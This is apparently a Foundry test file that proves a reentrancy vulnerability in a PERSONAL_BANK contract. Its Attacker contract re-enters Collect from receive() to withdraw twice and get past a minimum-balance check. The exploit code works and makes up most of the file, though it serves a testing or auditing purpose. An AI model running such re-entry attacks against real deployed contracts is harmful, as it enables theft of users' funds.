
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PERSONAL_BANK, LogFile} from "../src/PERSONAL_BANK.sol";

contract TestReentrancyPERSONAL_BANK is Test {
    PERSONAL_BANK public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new PERSONAL_BANK();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 1000); 
        vm.assume(attackVal < type(uint128).max);

        // --- 2. State Configuration (Pre-Condition) ---
        // We set MinSum to be slightly larger than attackVal.
        // This ensures that after one withdrawal of attackVal, the remaining balance 
        // (which will be attackVal) is LESS than MinSum, preventing a second sequential withdrawal.
        // Reentrancy bypasses this check because the balance is not updated until after the call.
        uint256 minSum = attackVal + 1;
        
        _contractUnderTest.SetMinSum(minSum);
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.Initialized();

        // --- 3. Funding ---
        // We need to deposit 2 * attackVal to have enough funds for two withdrawals.
        uint256 depositAmount = attackVal * 2;
        
        // Fund the Victim (so it has ETH to steal/withdraw)
        vm.deal(address(_contractUnderTest), depositAmount * 10); 
        
        // Fund the Test Contract (address(this))
        vm.deal(address(this), depositAmount);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: depositAmount}(depositAmount);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PERSONAL_BANK public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = PERSONAL_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 depositAmount) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        // Deposit funds to pass the balance check in Collect
        victim.Deposit{value: depositAmount}();
    }

    function attack(uint256 withdrawAmount) public {
        storedVal = withdrawAmount;
        uint256 initialBalance = address(this).balance;

        // Call the vulnerable function
        victim.Collect(withdrawAmount);

        // Verify Success: 
        // We expect to have withdrawn 'withdrawAmount' twice.
        // Initial balance (before Collect) + 2 * withdrawAmount
        if (address(this).balance >= initialBalance + (withdrawAmount * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            // Re-enter the contract using the stored Fuzz/Symbolic value.
            victim.Collect(storedVal);
        }
    }
}
